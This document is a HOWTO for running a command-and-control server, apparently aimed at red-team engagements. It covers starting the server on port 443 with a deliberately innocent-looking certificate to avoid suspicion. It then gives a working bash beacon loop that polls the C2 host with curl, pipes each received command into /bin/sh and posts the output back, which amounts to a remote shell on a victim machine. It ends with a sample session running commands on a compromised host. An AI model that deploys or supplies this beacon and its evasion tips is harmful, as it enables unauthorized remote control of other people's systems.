HOWTO
=====

1. Get a C2 server set up
-------------------------
This is the easy part.  Assuming you've already got a binary named C2, start
it up

```sh
$ ./c2
2017/05/19 01:33:20 Generating TLS keypair for 0.0.0.0
2017/05/19 01:33:20 rsa.PublicKey *rsa.PrivateKey
2017/05/19 01:33:20 Made certificate for 0.0.0.0
2017/05/19 01:33:20 Listening for controller connections to ./c2.sock
2017/05/19 01:33:20 Listening for https connections to 0.0.0.0:4433
```

This starts the C2 server listening with a self-signed cert on TCP port 4433.
While this is sufficient for testing, in real life it'd be better to use a
trusted (or at least less suspicious) TLS keypair.

```sh
./c2 -cert innocent.crt -key innocent.key
```

Of course, beacons to 4433 are suspicious.  A firewall rule to redirect traffic
originally destined to 4433 to 443 is probably a good idea.  If you're running
on Kali as root anyways, the C2 server can be made to listen on 443 itself.

```sh
./c2 -cert innocent.crt -key innocent.key -l 0.0.0.0:443
```

By default, a Unix domain socket named `c2.sock` is created in the current
directory.  It should probably go in `/var/run` with the rest of the sockets.

```sh
./c2 -cert innocent.crt -key innocent.key -l 0.0.0.0:443 -csock /var/run/c2.sock
```

On Windows, Unix domain sockets don't work, so it's necessary to listen for
control connections on a TCP socket.  This is unencrypted, so please only
listen on loopback.

```sh
c2.exe -cert innocent.crt -key innocent.key -l 0.0.0.0:443 -csock 127.0.0.1:4321 -csockip
```

The C2 server doesn't daemonize itself, so starting it backgrounded (or in
tmux/screen) is a good idea.

```sh
nohup ./c2 -cert innocent.crt -key innocent.key -l 0.0.0.0:443 -csock /var/run/c2.sock >>c2.log 2>&1 &


2. Get a victim to beacon back
------------------------------
This one's up to you.
On a linux box you can run something like 
```sh
while :; do CMD=$(curl -sqLk https://c2address/victimID); if [ -z "$CMD" ]; then continue; fi; echo "-> $CMD"; echo "$CMD" | /bin/sh 2>&1 | curl --data-binary '@-' -sqLk http://c2address/victimID; sleep 1; done
```

Or, more clearly

```sh
while :; do
        CMD=$(curl -sqLk https://c2address/victimID)
        if [ -z "$CMD" ]; then
                continue
        fi

        echo "-> $CMD"

        echo "$CMD" | /bin/sh 2>&1 | \
            curl --data-binary '@-' -sqLk http://c2address/victimID

        sleep 1
done
```

One second beacons might arouse suspicion, but for testing they work fine.  For
real engagments, the becon interval can be as long as needed.

3. Control
----------
Connect to the control socket.  rlwrap is a nifty tool to make erasing and such
a little less painful.

```
$ rlwrap nc -vU /var/run/c2.sock
Welcome.  You are unix-sock-1495172888282047855.
Which endpoint would you like to control?
Enter an endpoint path or ? to list endpoints.
```

If you're already getting beacons, list the endpoints available.

```
Enter an endpoint path or ? to list endpoints.
> ?
Endpoint                  Last beacon
--------                  -----------
/client_blue/printserv    2017-05-19 01:48:05.544662056 -0400 EDT

Which endpoint would you like to control?
Enter an endpoint path or ? to list endpoints.
```

Only one in the example, we'll control it.

```
Enter an endpoint path or ? to list endpoints.
> /client_blue/printserv
/client_blue/printserv> uname -a
/client_blue/printserv>  -> "uname -a"
OpenBSD printserv.dmz.clientnetwork.com 6.1 GENERIC.MP#20 amd64
uptime
/client_blue/printserv>  -> "uptime"
 1:52AM  up 20 days,  5:46, 1 user, load averages: 2.80, 2.94, 3.01
```

The output, it's not pretty, but it works.

Multiple control connections work just fine, as do multiple control connections
to the same endpoint.

Enjoy.
